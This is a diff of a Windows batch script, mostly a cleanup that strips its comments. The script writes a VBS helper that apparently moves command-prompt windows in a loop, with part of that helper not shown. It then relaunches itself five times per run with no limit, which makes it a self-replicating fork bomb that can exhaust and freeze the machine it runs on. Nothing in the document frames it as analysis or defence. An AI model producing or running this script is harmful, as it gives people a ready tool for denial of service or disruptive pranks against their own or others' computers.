@@ -1,14 +1,13 @@
-batch
 @echo off
 setlocal enabledelayedexpansion
 
-:: Set the number of duplicates to create
+
 set count=5
 
-:: Create a temporary VBS file for moving windows
+
 set "vbsFile=move.vbs"
 
-:: Create the VBS script to move the command prompt windows
+
 (
     echo Set objShell = CreateObject("WScript.Shell")
     echo Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
@@ -27,15 +26,12 @@ set "vbsFile=move.vbs"
     echo Loop
 ) > "%vbsFile%"
 
-:: Duplicate the batch file itself
 for /L %%i in (1,1,%count%) do (
     start "" "%~f0"
 )
 
-:: Run the VBS script
 start "" wscript "%vbsFile%"
 
-:: Clean up the VBS file after 10 seconds
 timeout /t 10 > nul
 del "%vbsFile%"
 
